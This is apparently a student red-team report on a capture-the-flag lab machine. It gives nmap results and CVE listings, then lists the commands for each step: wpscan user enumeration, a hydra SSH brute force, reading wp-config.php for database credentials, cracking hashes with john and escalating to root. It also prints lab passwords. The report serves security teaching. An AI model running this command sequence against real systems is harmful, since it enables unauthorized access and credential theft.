# Red Team: Summary of Operations

## Table of Contents
- Exposed Services 
- Critical Vulnerabilities 
- Exploitation

# Exposed Services

### Nmap scan results for each machine reveal the below services and OS details:

![01_nmap](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/01_nmap.png)

### This scan identifies the services below as potential points of entry:

  ```
    22/tcp SSH OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
    80/tcp http Apache httpd 2.4.10 ((Debian))
    111/tcp rpcbind 2-4 (RPC #100000)
    139/tcp netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
    445/tcp microsoft-ds Samba smbd 4.2.14-Debian (workgroup: WORKGROUP)
  ```

### Based on ths scan, the following vulnerabilities can be exploited on this system:

- [CVE-2021-28041 Open SSH](https://www.cve.org/CVERecord?id=CVE-2021-28041)
- [CVE-2017-15710 Apache https 2.4.10](https://www.cve.org/CVERecord?id=CVE-2017-15710)
- [CVE-2017-8779 rcpbind open port](https://www.cve.org/CVERecord?id=CVE-2017-8779)
- [CVE-2017-7494 Samba NetBIOS](https://www.cve.org/CVERecord?id=CVE-2017-7494)


# Exploitation

The Red Team was able to penetrate `Target 1` and retrieve the following confidential data:

- Enumerating WordPress site with `wpscan` security tool to obtain usernames Michael and Steven.
- Command used: `wpscan --url http://192.168.1.110/wordpress -eu` 
- Users found:

![02_wpusers](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/02_users.png)


### EXPLOIT:

- Cracking Michael's credentials with `hydra -l michael -P /usr/share/wordlist/rockyou.txt -s 22 <IP> ssh` or by guessing the password being the same as his name...

![03_ssh](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/03_ssh.png)

- `SSH` into Michael's account with `ssh michael@192.168.1.110`
- Searching for the `flag1` by using: `find . | xargs grep "flag1" *` or `grep -RE "flag1" html` 

![04_flag1](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/04_flag1.png)

![05_flag1](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/05_flag1.png)

- Searching for `flag2` in the `/var/www` directory and finding it easily:

![06_flag2](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/06_flag2.png)

### EXPLOIT: 

- Finding the `MySQL` database credentials by printing the contents of `/var/www/html/wordpress/wp-config.php`. We can see that the username is `root` and the password is `R@v3nSecurity`:

![07_db1](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/07_db1.png)

- Using the credentials to login to MySQL with `mysql -u root -p` and searching for the user password hashes with the following sequence of commands:

View all databases: `show databases;` 

Use Wordpress DB: `use wordpress;`

Show Tables of Wordpress DB: `show tables;`

View all users table objects: `select * from wp_users`

![08_dbusers](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/08_dbusers.png)

- Finding `flag3` and `flag4` by exploring the rest of the database tables. We run `select * from wp_posts` to find:

![09_flag3](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/09_flag3.png)

![10_flag4](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/10_flag4.png)

### EXPLOIT: 

- Using `john` to crack the password hashes for Steve's credentials: `john -wordlist:/usr/share/wordlists/rockyou.txt hash.txt` to find his password: pink84

![11_john](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/11_john.png)

- Now we can `SSH` into Steven's account with: `ssh steven@192.168.1.110` and escalate privileges for root access:

![12_root](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/12_root.png)

![13_root](https://raw.githubusercontent.com/yffenim/final_project/main/OffensiveReportImages/13_root.png)
